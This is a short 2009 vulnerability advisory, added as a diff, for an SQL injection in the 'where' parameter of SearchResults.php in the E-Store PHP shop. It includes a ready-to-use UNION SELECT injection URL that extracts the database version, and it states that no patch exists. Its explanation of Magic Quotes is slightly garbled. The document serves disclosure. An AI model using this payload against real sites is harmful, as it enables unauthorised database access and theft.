@@ -1,0 +1,52 @@
+E-Store SQL Injection Vulnerability
+
+ Name              E-Store
+ Vendor            http://www.getaphpsite.com
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2009-09-03
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ VI.   DISCLOSURE TIMELINE
+
+
+I. ABOUT THE APPLICATION
+
+E-Store is a commercial PHP e-commerce.
+
+
+II. DESCRIPTION
+
+This application presents a SQL Injection bug.
+
+
+III. ANALYSIS
+
+Summary:
+
+ A) SQL Injection
+
+A) SQL Injection
+
+The GET where parameter  passed to SearchResults.php has not
+properly sanitised. Because of the affected query, the Magic
+Quotes GPC flag (php.in) may be on.
+
+
+IV. SAMPLE CODE
+
+http://site/path/SearchResults.php?SearchTerm=&where=ItemName UNION
+ALL SELECT 1,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16%23&ord1=ItemName&ord2=asc&search1=Go!
+
+
+V. FIX
+
+No patch.
